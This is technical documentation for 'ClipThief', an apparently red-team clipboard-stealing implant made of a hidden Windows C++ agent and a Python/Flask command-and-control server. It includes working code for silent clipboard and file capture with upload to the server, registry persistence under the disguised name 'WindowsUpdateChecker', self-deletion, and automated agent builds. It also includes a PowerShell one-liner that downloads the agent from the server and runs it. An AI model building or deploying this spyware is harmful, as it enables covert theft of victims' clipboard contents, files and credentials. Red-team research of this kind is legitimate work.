# ClipThief — Technical Project Documentation

**Author:** @erberkan / B3R-SEC  
**Purpose:** Red team / security research  
**Architecture:** Windows Agent (C++) + Terminal C2 (Python/Flask + SQLite + Rich)

---

## Table of Contents

1. [Project Overview](#1-project-overview)
2. [Directory Structure](#2-directory-structure)
3. [System Architecture](#3-system-architecture)
4. [Agent (C++)](#4-agent-c)
   - 4.1 [Build Settings](#41-build-settings)
   - 4.2 [Dependencies and Libraries](#42-dependencies-and-libraries)
   - 4.3 [Constants and Global Variables](#43-constants-and-global-variables)
   - 4.4 [UUID Generation](#44-uuid-generation)
   - 4.5 [Agent ID Persistence (Registry)](#45-agent-id-persistence-registry)
   - 4.6 [Base64 Encoder](#46-base64-encoder)
   - 4.7 [JSON Helpers](#47-json-helpers)
   - 4.8 [HTTP Communication (WinINet)](#48-http-communication-wininet)
   - 4.9 [System Information Collection](#49-system-information-collection)
   - 4.10 [Agent Registration](#410-agent-registration)
   - 4.11 [Clipboard Monitoring](#411-clipboard-monitoring)
   - 4.12 [DIB → BMP Conversion](#412-dib--bmp-conversion)
   - 4.13 [Self-Destruct (Kill)](#413-self-destruct-kill)
   - 4.14 [Persistence (Persist)](#414-persistence-persist)
   - 4.15 [Command Polling Thread](#415-command-polling-thread)
   - 4.16 [Message Window and WndProc](#416-message-window-and-wndproc)
   - 4.17 [WinMain Entry Point](#417-winmain-entry-point)
5. [C2 Server (Python)](#5-c2-server-python)
   - 5.1 [Dependencies](#51-dependencies)
   - 5.2 [SQLite Database](#52-sqlite-database)
   - 5.3 [REST API Endpoints](#53-rest-api-endpoints)
   - 5.4 [In-Memory State Management](#54-in-memory-state-management)
   - 5.5 [Heartbeat Monitor — Agent Timeout](#55-heartbeat-monitor--agent-timeout)
   - 5.6 [Agent Builder — Automatic Compilation](#56-agent-builder--automatic-compilation)
   - 5.7 [Logging System](#57-logging-system)
   - 5.8 [Rich UI — Components](#58-rich-ui--components)
   - 5.9 [Terminal UI Screens](#59-terminal-ui-screens)
   - 5.10 [Database Management Screen](#510-database-management-screen)
   - 5.11 [Startup Flow and Main Loop](#511-startup-flow-and-main-loop)
6. [Communication Protocol](#6-communication-protocol)
7. [Data Flow Diagram](#7-data-flow-diagram)
8. [Security Notes](#8-security-notes)

---

## 1. Project Overview

ClipThief consists of two components:

| Component | Language | File |
|-----------|----------|------|
| **Agent** | C++ (Win32 API) | `ClipboardDump/ClipboardDump/ClipboardDump.cpp` |
| **C2 Server** | Python 3 + Flask + Rich | `C2/c2_server.py` |

The agent runs silently in the background on the target Windows system. It captures clipboard changes (text, images, files) and sends them over HTTP to the C2. The C2 provides a color-coded terminal interface via the Rich library; the operator can monitor each agent, view history, send commands, and manage the database.

When the C2 starts, the source code is automatically compiled with the target IP/port, saved as `agents/bingo.exe`, and served over HTTP. The operator is shown a PowerShell one-liner deployment payload.

---

## 2. Directory Structure

```
ClipThief/
├── ClipboardDump/
│   ├── ClipboardDump.sln               # Visual Studio solution
│   └── ClipboardDump/
│       ├── ClipboardDump.cpp           # Agent source code (single file)
│       ├── ClipboardDump.vcxproj       # MSVC project file (SubSystem=Windows)
│       └── x64/{Debug,Release}/        # Build outputs
│
├── C2/
│   ├── c2_server.py                    # C2 server (single file)
│   ├── requirements.txt                # Python dependencies (flask, rich)
│   ├── setup_and_run.bat               # Windows startup script
│   ├── c2_data.db                      # SQLite database (auto-created)
│   ├── agents/                         # Compiled agent EXEs
│   │   └── bingo.exe                   # Auto-compiled at C2 startup
│   ├── downloads/                      # Downloaded clipboard files
│   └── logs/                           # Session log files
│       └── YYYY-MM-DD_HH-MM-SS.log     # New file per startup
│
├── PROJECT.md                          # Technical documentation (Turkish)
├── PROJECT_EN.md                       # This file (English)
└── README.md                           # Setup and usage guide
```

---

## 3. System Architecture

```
┌─────────────────────────────┐          HTTP/JSON          ┌──────────────────────────────────┐
│         AGENT (C++)         │ ──────────────────────────► │       C2 SERVER (Python)         │
│                             │                             │                                  │
│  WinMain (Windows subsys.)  │  POST /api/agent/register   │  Flask REST API (daemon)         │
│  ├─ LoadOrCreateAgentId()   │  POST /api/agent/<id>/clip  │  ├─ SQLite WAL (c2_data.db)      │
│  ├─ RegisterAgent()         │  GET  /api/agent/<id>/cmd   │  ├─ In-memory agents{}           │
│  ├─ AddClipboardListener()  │ ◄──────────────────────────  │  ├─ Heartbeat monitor (daemon)   │
│  ├─ WndProc (message loop)  │  {"command":"kill|persist"}  │  ├─ Agent Builder (startup)      │
│  └─ CommandPollThread()     │                             │  └─ Rich Terminal UI (main)      │
│                             │  GET  /agent/bingo.exe      │                                  │
│  Clipboard Formats:         │ ◄──────────────────────────  │  Threads:                        │
│  ├─ CF_UNICODETEXT (text)   │  [EXE binary download]      │  ├─ flask (daemon)               │
│  ├─ CF_HDROP (files)        │                             │  ├─ heartbeat (daemon)           │
│  └─ CF_DIB (images→BMP)     │                             │  └─ main (UI loop)               │
└─────────────────────────────┘                             └──────────────────────────────────┘
         │ Registry                                                    │ c2_data.db
         │ HKCU\...\ClipAgent → AgentID = <UUID>                      │ agents + clipboard_entries
                                                                       │ logs/YYYY-MM-DD_HH-MM-SS.log
```

---

## 4. Agent (C++)

### 4.1 Build Settings

| Setting | Value |
|---------|-------|
| Toolset | MSVC v143 (VS 2022) |
| Platform | x64 / Win32 |
| Subsystem | **Windows** (no console window) |
| Character Set | Unicode |
| Entry point | `WinMain` |

Because the subsystem is `Windows`, no terminal window opens when the EXE is executed. The process is visible in Task Manager but presents no UI to the user.

> **C2 auto-compilation:** The source is compiled by the C2's `build_agent()` function. The operator does not need to build manually in Visual Studio — `bingo.exe` is generated automatically on every C2 startup using the `--agent-ip` and `--port` values.

### 4.2 Dependencies and Libraries

```cpp
#include <winsock2.h>   // Winsock2 — ws2_32.lib  (must come before windows.h)
#include <ws2tcpip.h>   // getaddrinfo, inet_ntop
#include <windows.h>    // Win32 API base
#include <wininet.h>    // HTTP — wininet.lib
#include <shellapi.h>   // DragQueryFile (CF_HDROP) — shell32.lib
#include <rpc.h>        // UuidCreate, UuidToStringA — rpcrt4.lib
```

Linker directives are embedded in the source file via `#pragma comment(lib, ...)`; no separate project file configuration is needed.

> **Why `rpc.h` instead of `objbase.h`?**  
> When `WIN32_LEAN_AND_MEAN` is defined, `windows.h` excludes OLE/COM headers.  
> `CoCreateGuid` therefore causes a compile error. The RPC library is unaffected by this macro;  
> `UuidCreate` + `UuidToStringA` provides the same functionality without that dependency.

### 4.3 Constants and Global Variables

```cpp
static const char* C2_HOST   = "127.0.0.1";    // C2 address — written by build_agent()
static const int   C2_PORT   = 5000;            // C2 port    — written by build_agent()
static const int   POLL_MS   = 3000;            // Command polling interval (ms)
static const char* REG_PATH  = "Software\\Microsoft\\Windows\\CurrentVersion\\ClipAgent";
static const char* TASK_NAME = "WindowsUpdateChecker"; // HKCU Run value name (persistence)
static const size_t MAX_FILE = 50 * 1024 * 1024;       // File upload limit (50 MB)

static std::string   g_agentId;        // Persistent unique ID (loaded from registry)
static HWND          g_hwnd = NULL;    // Message-only window handle
static volatile bool g_running = true; // Thread termination flag
```

`C2_HOST` and `C2_PORT` values are written by `build_agent()` via regex into a temporary copy of the source file; the original source is never modified.

### 4.4 UUID Generation

```cpp
static std::string GenerateUUID()
{
    UUID uuid = {};
    UuidCreate(&uuid);              // Windows cryptographic RNG — RFC 4122 compliant

    RPC_CSTR rpcStr = nullptr;
    UuidToStringA(&uuid, &rpcStr);  // "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    std::string result(reinterpret_cast<char*>(rpcStr));
    RpcStringFreeA(&rpcStr);        // Free from RPC heap
    return result;
}
```

### 4.5 Agent ID Persistence (Registry)

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ClipAgent
  └─ AgentID : REG_SZ = "a1b2c3d4-e5f6-..."
```

On first run, a new ID is generated via `UuidCreate` and written to the registry.  
On subsequent runs, the same key is read — the C2 recognizes it as the same agent.  
When `SelfDestruct()` is called, this key is removed with `RegDeleteKeyA`.

**Why HKCU?** Writing to `HKLM` requires administrator privileges. `HKCU` is accessible by standard users.

### 4.6 Base64 Encoder

RFC 4648-compliant implementation without any external library. Three wrappers:

| Function | Usage |
|----------|-------|
| `Base64Encode(const BYTE*, size_t)` | Raw byte array |
| `Base64EncodeVec(const vector<BYTE>&)` | Image / file data |
| `Base64EncodeStr(const string&)` | Text clipboard |

### 4.7 JSON Helpers

Two minimal functions without an external JSON library:

```cpp
// Escapes " \ \n \r \t characters
static std::string JsonEscape(const std::string& s);

// Parses Flask's "key": "value" format (tolerates whitespace after colon)
static std::string JsonGetString(const std::string& json, const std::string& key);
```

> **Why a custom parser?** Flask's `jsonify` produces `{"key": "value"}` with a space after the colon.  
> A naive `"key":"` search always returns `npos`. The parser skips all whitespace and tab  
> characters between the colon and the opening quote, correctly handling both formats.

### 4.8 HTTP Communication (WinINet)

```
InternetOpenA()           → Open HINTERNET session
  └─ InternetConnectA()   → Host:Port connection
       └─ HttpOpenRequestA("POST" | "GET", path)
            └─ HttpSendRequestA(headers, body)
                 └─ InternetReadFile() loop → read response
                      └─ Every handle closed with InternetCloseHandle
```

Handle cleanup is guaranteed on all early-exit error paths.

### 4.9 System Information Collection

| Function | Win32 API | Output |
|----------|-----------|--------|
| `GetUsername()` | `GetUserNameA` | Logged-in username |
| `GetHostname()` | `GetComputerNameA` | NetBIOS machine name |
| `GetLocalIP()` | `gethostname` + `getaddrinfo` | IPv4 address |
| `GetOSVersion()` | `RtlGetVersion` (ntdll.dll) | "Windows 10.0 Build 19045" |

**Why `RtlGetVersion`?**  
`GetVersionEx` may return the manifest version due to application compatibility shims starting with Windows 8.1. `RtlGetVersion` operates at the kernel level and always returns the real build number.

### 4.10 Agent Registration

At startup, system information is sent to the C2 via `POST /api/agent/register`.  
If the C2 is unreachable, `HttpPost` silently returns `false`; the agent continues running.

### 4.11 Clipboard Monitoring

The agent registers with the message system via `AddClipboardFormatListener(hwnd)`. Every change delivers `WM_CLIPBOARDUPDATE`.

**Format priority order:**

```
WM_CLIPBOARDUPDATE
│
├─ CF_UNICODETEXT present?
│   └─ Yes → GlobalLock → WideCharToMultiByte(CP_UTF8) → Base64 → POST "text"
│              GlobalUnlock → CloseClipboard → return
│
├─ CF_HDROP present? (file copy)
│   └─ Yes → DragQueryFile → up to 5 file paths
│              Each file: ifstream binary → max 50 MB → Base64 → POST "file"
│              GlobalUnlock → CloseClipboard → return
│
└─ CF_DIB present? (screenshot / image)
    └─ Yes → DibToBmp() → BMP bytes → Base64 → POST "image"
               CloseClipboard → return
```

**Why `CF_UNICODETEXT` instead of `CF_TEXT`?**  
`CF_TEXT` is ANSI and corrupts non-Latin characters. `CF_UNICODETEXT` contains UTF-16; `WideCharToMultiByte(CP_UTF8)` converts it to UTF-8 losslessly.

### 4.12 DIB → BMP Conversion

`CF_DIB` format: `BITMAPINFOHEADER + color table + pixel data`.  
A `BITMAPFILEHEADER` is prepended to produce a valid `.bmp` — no GDI+ or libpng required.

```cpp
BITMAPFILEHEADER bfh = {};
bfh.bfType    = 0x4D42;  // 'BM'
bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + bih->biSize + colorTableSize;
bfh.bfSize    = sizeof(BITMAPFILEHEADER) + dataSize;
// Header + DIB data → single buffer → Base64 → C2
```

### 4.13 Self-Destruct (Kill)

```
1. RegDeleteKeyA(HKCU, REG_PATH)     → Remove Agent ID from registry
2. RegDeleteValueA(HKCU, Run key)    → Remove persistence Run value (if set)
3. GetModuleFileNameA()               → Get own EXE path
4. Create %TEMP%\cleanup_<PID>.bat:
       ping 127.0.0.1 -n 4 >nul      → Wait ~3s for process to exit
       del /f /q "<exePath>"          → Delete EXE
       del /f /q "%~f0"              → Delete batch file itself
5. ShellExecuteA("open", batPath, SW_HIDE) → Launch batch hidden
6. ExitProcess(0)                    → Terminate process
```

> **Known limitation:** Opening a `.bat` file via `ShellExecuteA("open", ...)` on Windows 10/11  
> is unreliable — it may fail silently.  
> Alternative: running `cmd.exe /C ping ... & del ...` directly via `ShellExecuteExA` or  
> `CreateProcess` + `CREATE_NO_WINDOW` is more reliable.

### 4.14 Persistence (Persist)

Persistence is achieved via the HKCU Run registry key — no administrator privileges required.

```cpp
static void AddPersistence()
{
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    // Triggered on every user login; no administrator privileges required.
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, TASK_NAME, 0, REG_SZ,
                       (const BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hKey);
    }
}
```

**Registry path written:**  
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateChecker` = `<EXE path>`

Manual removal:
```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f
```

### 4.15 Command Polling Thread

```cpp
static DWORD WINAPI CommandPollThread(LPVOID)
{
    std::string path = "/api/agent/" + g_agentId + "/command";
    while (g_running) {
        Sleep(POLL_MS);   // Wait 3s
        std::string resp;
        if (HttpGet(path, resp)) {
            std::string cmd = JsonGetString(resp, "command");
            if (cmd == "kill")    SelfDestruct();   // does not return
            if (cmd == "persist") AddPersistence();
            // cmd == "none" → ignore
        }
    }
    return 0;
}
```

The command is placed in the C2's `pending_cmds` map; it is delivered on the next poll and removed from the map (single-delivery guarantee). Every poll also updates `last_seen`, so no separate heartbeat endpoint is needed.

### 4.16 Message Window and WndProc

```cpp
g_hwnd = CreateWindowExW(0, L"ClipThiefWnd", L"", 0,
                          0, 0, 0, 0,
                          HWND_MESSAGE, NULL, hInstance, NULL);
```

An `HWND_MESSAGE` window is invisible on screen, does not appear in Alt+Tab, and only receives messages.

```cpp
case WM_CLIPBOARDUPDATE: HandleClipboardUpdate(); return 0;
case WM_DESTROY:         PostQuitMessage(0);      return 0;
```

### 4.17 WinMain Entry Point

```cpp
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int)
{
    WSAStartup(MAKEWORD(2, 2), &wsa);   // Initialize Winsock
    g_agentId = LoadOrCreateAgentId();  // Load/create ID from registry
    RegisterAgent();                     // Register with C2 (silent on failure)

    RegisterClassW(&wc);
    CreateWindowExW(..., HWND_MESSAGE, ...);
    AddClipboardFormatListener(g_hwnd);

    CreateThread(NULL, 0, CommandPollThread, NULL, 0, NULL);

    MSG msg = {};
    while (g_running) {
        BOOL ret = GetMessageW(&msg, NULL, 0, 0);
        if (ret == 0 || ret == -1) break;
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    RemoveClipboardFormatListener(g_hwnd);
    g_running = false;
    WaitForSingleObject(hThread, 2000);
    WSACleanup();
    return 0;
}
```

`WinMain` + `SubSystem=Windows` → no console window, runs silently in the background.

---

## 5. C2 Server (Python)

### 5.1 Dependencies

```
flask>=3.0.0    # HTTP REST API server
rich>=13.0.0    # Colored terminal UI (table, panel, syntax highlight, prompt)
sqlite3         # Python standard library — no installation required
```

Additional requirement for `build_agent()`: Visual Studio 2022 (C++ Desktop workload) — `MSBuild.exe` and Windows SDK must be installed.

### 5.2 SQLite Database

**File:** `C2/c2_data.db`  
**Mode:** WAL (Write-Ahead Logging) — concurrent R/W safe across Flask threads and the UI thread.

**Schema:**

```sql
CREATE TABLE agents (
    id         TEXT PRIMARY KEY,   -- UUID (rpc.h UuidCreate)
    user       TEXT,               -- Windows username
    hostname   TEXT,               -- NetBIOS machine name
    ip         TEXT,               -- IPv4 address
    os         TEXT,               -- "Windows 10.0 Build 19045"
    first_seen TEXT,               -- First connection time
    last_seen  TEXT,               -- Last activity (updated by polling)
    status     TEXT                -- "active" | "dead"
);

CREATE TABLE clipboard_entries (
    rowid      INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id   TEXT NOT NULL,      -- agents.id FK
    seq        INTEGER NOT NULL,   -- Per-agent incrementing sequence number
    type       TEXT NOT NULL,      -- "text" | "image" | "file"
    content    TEXT NOT NULL,      -- Base64-encoded content
    filename   TEXT,               -- Original file/image name (empty for text)
    timestamp  TEXT NOT NULL,      -- "2026-04-21 14:32:11"
    FOREIGN KEY(agent_id) REFERENCES agents(id)
);
```

**DB functions:**

| Function | Purpose |
|----------|---------|
| `db_connect()` | Opens WAL-mode connection, `row_factory=Row` |
| `db_init()` | Creates tables, loads agents into memory |
| `db_upsert_agent(info)` | `INSERT ... ON CONFLICT DO UPDATE` |
| `db_insert_clip(...)` | Inserts a new clipboard entry |
| `db_get_clips(agent_id)` | Returns all clipboard history for an agent in seq order |
| `db_next_seq(agent_id)` | `MAX(seq)+1` — per-agent sequence number |
| `db_clear_all()` | Completely clears both tables |
| `db_clear_agent(agent_id)` | Deletes a single agent and its clipboard entries |

### 5.3 REST API Endpoints

#### `POST /api/agent/register`

**Request body:**
```json
{
  "id":       "a1b2c3d4-e5f6-...",
  "user":     "erberkan",
  "hostname": "DESKTOP-ABC123",
  "ip":       "192.168.1.50",
  "os":       "Windows 10.0 Build 19045"
}
```

**Behavior:**
- **New agent:** Add to `agents{}` + DB → `new_agent_queue.put()` → Rich Panel notification → log INFO
- **Reconnect:** Update `last_seen` + `status="active"` → colored notification → log INFO

#### `POST /api/agent/<id>/clipboard`

**Request body:**
```json
{ "type": "text", "content": "<base64>", "filename": "" }
```

`type`: `"text"` | `"image"` | `"file"`  
Each call gets a sequence number via `db_next_seq`, is written to the DB, and logged INFO.

#### `GET /api/agent/<id>/command`

**Response:** `{"command": "none" | "kill" | "persist"}`

`pending_cmds.pop(agent_id, "none")` — command is delivered once, removed from map.  
Also updates `last_seen` (polling = heartbeat). If command is not `none`, logged INFO.

#### `GET /agent/bingo.exe`

Serves the compiled agent EXE as a binary response. `agents/bingo.exe` is produced by `build_agent()` at startup. Download is logged INFO; missing file is logged WARNING.

### 5.4 In-Memory State Management

```python
agents: dict       = {}              # Fast-access copy of the DB
pending_cmds: dict = {}              # agent_id → "kill" | "persist"
db_lock            = threading.Lock()  # Thread safety for agents + pending_cmds
new_agent_queue    = queue.Queue()   # Flask thread → UI thread communication
AGENT_TIMEOUT_SEC  = 10             # Heartbeat timeout threshold (seconds)
```

`_ui_lock` is a separate lock — serializes terminal read/write operations.  
`db_lock` protects DB and in-memory state.  
The two locks are independent; no deadlock risk.

### 5.5 Heartbeat Monitor — Agent Timeout

```python
def _heartbeat_monitor():
    """Background thread — marks agent dead when polling stops."""
    while True:
        time.sleep(5)           # Check every 5 seconds
        now = datetime.now()
        with db_lock:
            for agent_id, a in agents.items():
                if a["status"] == "dead": continue
                elapsed = (now - datetime.strptime(a["last_seen"], fmt)).total_seconds()
                if elapsed > AGENT_TIMEOUT_SEC:   # > 10s no polling
                    a["status"] = "dead"
                    db_upsert_agent(a)
                    log.warning(f"AGENT DEAD  id={agent_id}  elapsed={int(elapsed)}s")
                    _notify("dead", f"AGENT DEAD  {a['user']}@{a['hostname']}  ...")
```

**Timeline (after KILL):**

| t | Event |
|---|-------|
| 0s | Kill command queued — log INFO |
| ~3s | Last poll — agent receives command, shuts down — log INFO |
| ~13s | Heartbeat monitor detects timeout |
| ~15s | `[!] AGENT DEAD` notification + log WARNING |

If the agent restarts, `api_register` sets status back to `"active"` and a reconnect notification + log INFO is shown.

### 5.6 Agent Builder — Automatic Compilation

`build_agent(c2_ip, c2_port)` runs at C2 startup:

```
1. Verify CPP_SRC and VCXPROJ_SRC exist
2. _find_msbuild() — locate MSBuild.exe:
       a. vswhere.exe (C:\Program Files (x86)\Microsoft Visual Studio\Installer\)
       b. Fallback: VS2022/2019 × Community/Professional/Enterprise/BuildTools
3. Create tempfile.TemporaryDirectory()
4. Read ClipboardDump.cpp source text
5. Write C2_HOST and C2_PORT values via regex:
       static const char* C2_HOST = "<c2_ip>"
       static const int   C2_PORT = <c2_port>
6. Copy modified CPP + original vcxproj to temp directory
7. Run MSBuild:
       msbuild ClipboardDump.vcxproj
           /p:Configuration=Release /p:Platform=x64
           /p:OutDir=<tmp>/out/ /nologo /verbosity:quiet
8. Copy output EXE to agents/bingo.exe
9. Serve via /agent/bingo.exe endpoint
```

**`--agent-ip` resolution:**

```python
if args.agent_ip:            agent_ip = args.agent_ip     # Explicitly provided
elif args.host != "0.0.0.0": agent_ip = args.host         # Specific listen address
else:                         agent_ip = _get_local_ip()   # Auto-detect
```

`_get_local_ip()`: `socket.connect("8.8.8.8:80")` + `getsockname()` — determines primary NIC IP efficiently.

**Payload display (at startup):**

```
╭──  PowerShell One-Liner  ─────────────────────────────────────────────────────╮
│  $p="$env:TEMP\bingo.exe";(New-Object Net.WebClient).DownloadFile(           │
│  'http://192.168.1.100:5000/agent/bingo.exe',$p);Start-Process $p            │
╰───────────────────────────────────────────────────────────────────────────────╯
```

### 5.7 Logging System

**File:** `C2/logs/<YYYY-MM-DD_HH-MM-SS>.log`  
A new log file is opened on every C2 startup. Logs from previous sessions are preserved.

**Setup:**

```python
def _setup_logger() -> logging.Logger:
    LOGS_DIR.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    fh = logging.FileHandler(LOGS_DIR / f"{ts}.log", encoding="utf-8")
    fh.setFormatter(logging.Formatter(
        "%(asctime)s  %(levelname)-8s  %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    ))
    ...
```

**Log levels and events:**

| Level | Event |
|-------|-------|
| INFO | `SERVER START` — startup parameters |
| INFO | `BUILD START` — compilation initiated |
| INFO | `BUILD OK` — bingo.exe size |
| ERROR | `BUILD FAILED` — MSBuild error, source not found |
| INFO | `AGENT NEW` — id, user, hostname, ip, os |
| INFO | `AGENT RECONNECT` — id, user, hostname, ip |
| INFO | `CLIPBOARD` — id, type, seq, preview (80 chars) |
| INFO | `COMMAND QUEUED` — operator queued kill/persist |
| INFO | `COMMAND SENT` — agent received command via polling |
| INFO | `AGENT DOWNLOAD` — bingo.exe downloaded successfully |
| WARNING | `AGENT DOWNLOAD FAILED` — bingo.exe not found |
| WARNING | `AGENT DEAD` — timeout, elapsed seconds |
| WARNING | `DB CLEARED` — all data wiped |
| INFO | `AGENT DELETED` — single agent removed |
| INFO | `SERVER STOP` — operator quit |

**Sample log output:**
```
2026-04-22 14:30:00  INFO      SERVER START    listen=0.0.0.0:5000  agent_ip=192.168.1.100
2026-04-22 14:30:01  INFO      BUILD START     c2_ip=192.168.1.100  c2_port=5000
2026-04-22 14:30:08  INFO      BUILD OK        output=agents\bingo.exe  size=98,304 bytes
2026-04-22 14:32:11  INFO      AGENT NEW       id=a1b2c3...  user=john  hostname=PC-01
2026-04-22 14:32:15  INFO      CLIPBOARD       id=a1b2c3...  type=text  seq=1  preview='SELECT * FROM users'
2026-04-22 14:35:00  INFO      AGENT DOWNLOAD  bingo.exe served  src=10.0.0.10
2026-04-22 14:40:00  INFO      COMMAND QUEUED  id=a1b2c3...  command=kill  by=operator
2026-04-22 14:40:03  INFO      COMMAND SENT    id=a1b2c3...  command=kill
2026-04-22 14:40:15  WARNING   AGENT DEAD      id=a1b2c3...  elapsed=12s
2026-04-22 15:00:00  WARNING   DB CLEARED      all agents and clipboard entries wiped  by=operator
2026-04-22 16:00:00  INFO      SERVER STOP     operator quit
```

### 5.8 Rich UI — Components

| Rich Component | Usage |
|----------------|-------|
| `rich.table.Table` | Agent list, clipboard history |
| `rich.panel.Panel` | New agent notification, agent details, DB stats, PowerShell payload |
| `rich.text.Text` | Color-labeled content blocks |
| `rich.syntax.Syntax` | Clipboard text — syntax highlighting |
| `rich.prompt.Confirm` | KILL / Wipe confirmation |
| `rich.console.Console` | All terminal output |

**Color coding:**

| Status / Type | Color |
|---------------|-------|
| `● active` | Green |
| `✗ dead` | Red |
| `[TXT]` | Cyan |
| `[IMG]` | Yellow |
| `[FILE]` | Green |
| DEAD notification | Red bold |
| RECONNECT notification | Yellow bold |
| PowerShell payload | Yellow bold |
| Payload panel border | Green |

**Syntax language detection (`_detect_lang`):**

```python
if text.startswith(("{", "[")):      → "json"
if "SELECT " in text.upper():        → "sql"
if "def " in text or "import " in:  → "python"
if text.startswith("<"):             → "xml"
else:                                → "text"  (plain panel)
```

### 5.9 Terminal UI Screens

**Main screen — `screen_agent_list()`**
```
╭────┬────────────┬──────────┬──────────────────┬─────────────────┬─────────────────────┬──────────╮
│  # │ ID         │ USER     │ HOSTNAME         │ IP              │ LAST SEEN           │ STATUS   │
├────┼────────────┼──────────┼──────────────────┼─────────────────┼─────────────────────┼──────────┤
│  1 │ a1b2c3d4...│ erberkan │ DESKTOP-ABC123   │ 192.168.1.50   │ 2026-04-21 14:35:00 │ ● active │
│  2 │ f9e8d7c6...│ admin    │ WORKSTATION-02   │ 10.0.0.15      │ 2026-04-21 14:20:00 │ ✗ dead   │
╰────┴────────────┴──────────┴──────────────────┴─────────────────┴─────────────────────┴──────────╯
```

**Agent menu — `screen_agent_menu()`**

```
╭─ Agent Details ──────────────────────────────╮
│ Agent ID:   a1b2c3d4-e5f6-...               │
│ User:       erberkan                         │
│ Hostname:   DESKTOP-ABC123                   │
│ IP:         192.168.1.50                     │
│ OS:         Windows 10.0 Build 19045         │
│ First seen: 2026-04-21 14:32:11              │
│ Last seen:  2026-04-21 14:35:00              │
│ Status:     ● active                         │
│ Clipboard:  47 entries                       │
╰──────────────────────────────────────────────╯

  [1] View clipboard history
  [2] Send KILL command  (self-destruct + delete)
  [3] Send PERSIST command  (add Run registry key)
  [4] Delete this agent from DB
  [0] Back
```

**Clipboard history — `screen_clipboard_list()`**

```
╭─ Clipboard — a1b2c3d...  (47 entries) ──────────────────────────────────────────╮
│  #   │ TYPE  │ TIMESTAMP             │ PREVIEW / FILENAME                       │
│    1 │ [TXT] │ 2026-04-21 14:32:15  │ SELECT * FROM users WHERE id=1            │
│    2 │ [IMG] │ 2026-04-21 14:35:01  │ clipboard.bmp                             │
│    3 │ [FILE]│ 2026-04-21 14:38:44  │ salary_report.xlsx                        │
╰──────────────────────────────────────────────────────────────────────────────────╯
```

**Text view — `screen_view_entry()` (text)**

When a language is detected, displayed with `rich.syntax.Syntax` in Monokai theme with line numbers.  
If no language is detected, displayed as plain text in a Panel.

**Binary file / image view:**

Saved to the `downloads/` folder and automatically opened with the OS default application.

### 5.10 Database Management Screen

```
╭─ Database ───────────────────────────╮
│ Path:      C:\...\C2\c2_data.db     │
│ Size:      2,048,576 bytes           │
│ Agents:    3                         │
│ Clipboard: 892 entries               │
╰──────────────────────────────────────╯

  [1] Clear ALL data  (agents + clipboard)
  [0] Back
```

Cleanup uses `Confirm.ask` — `[y/n]` prompt, re-asks on invalid input. Deletion is logged WARNING.  
A single agent can be deleted via Agent Menu → `[4]`. Deletion is logged INFO.

### 5.11 Startup Flow and Main Loop

**Startup sequence:**

```
main()
  │
  ├─ argparse → --host, --port, --agent-ip resolved
  ├─ DOWNLOADS_DIR, AGENTS_DIR, LOGS_DIR created
  ├─ _setup_logger() → logs/<ts>.log opened
  ├─ db_init() → c2_data.db initialized, agents{} loaded into memory
  ├─ log SERVER START
  ├─ build_agent(agent_ip, port):
  │       └─ bingo.exe compiled via MSBuild → agents/bingo.exe
  ├─ PowerShell one-liner printed to console
  ├─ "Press Enter to start C2..." — operator waits
  ├─ Flask thread (daemon) started
  ├─ Heartbeat monitor thread (daemon) started
  └─ run_terminal_ui() → main UI loop
```

**Main UI loop:**

```python
def run_terminal_ui():
    while True:
        try:
            agent_id = new_agent_queue.get_nowait()  # New agent?
            screen_agent_menu(agent_id)               # Go directly to menu
            continue
        except queue.Empty:
            pass

        agent_list = screen_agent_list()   # Show main screen
        choice = console.input("  > ")
        ...
```

Flask thread → `new_agent_queue.put(agent_id)` → UI thread returns from `input()` → queue drained → agent menu opens automatically.

---

## 6. Communication Protocol

| Endpoint | Direction | Frequency | Content |
|----------|-----------|-----------|---------|
| `POST /api/agent/register` | Agent → C2 | Once at startup | System info JSON |
| `POST /api/agent/<id>/clipboard` | Agent → C2 | On every clipboard change | Base64 + type + filename |
| `GET /api/agent/<id>/command` | Agent → C2 | Every 3 seconds (polling + heartbeat) | Command query |
| `GET /agent/bingo.exe` | Target → C2 | Once during deployment | EXE binary (HTTP download) |

All communication is plain HTTP/JSON. Data is Base64-encoded. Max body: 200 MB (Flask config).

---

## 7. Data Flow Diagram

```
C2 Starts
    │
    ├─► _setup_logger() → logs/<ts>.log
    ├─► db_init() → load c2_data.db
    ├─► build_agent(ip, port) → compile bingo.exe
    ├─► Display PowerShell payload
    ├─► "Press Enter to start C2..." wait
    └─► Start Flask + Heartbeat threads

Agent Deploy (on target system)
    │
    ├─► PowerShell one-liner executed
    │       └─ GET /agent/bingo.exe → bingo.exe downloaded
    │               └─ C2: log AGENT DOWNLOAD
    │
    └─► bingo.exe executed

Agent Running
    │
    ├─► LoadOrCreateAgentId()
    │       └─ Read UUID from registry / generate and write if not found
    │
    ├─► RegisterAgent()
    │       └─ POST /api/agent/register
    │               └─ C2: agents{} + DB ← new_agent_queue ← Rich Panel ← log NEW
    │
    ├─► AddClipboardFormatListener(HWND_MESSAGE)
    │
    ├─► CommandPollThread [background, every 3s]
    │       └─ GET /api/agent/<id>/command
    │               └─ C2: update last_seen
    │               ├─ "kill"    → SelfDestruct() ← log COMMAND SENT [does not return]
    │               ├─ "persist" → AddPersistence() ← log COMMAND SENT
    │               └─ "none"   → continue
    │
    └─► Message Loop
            └─ WM_CLIPBOARDUPDATE
                    ├─ CF_UNICODETEXT → UTF-8 → Base64 → POST (text) ← log CLIPBOARD
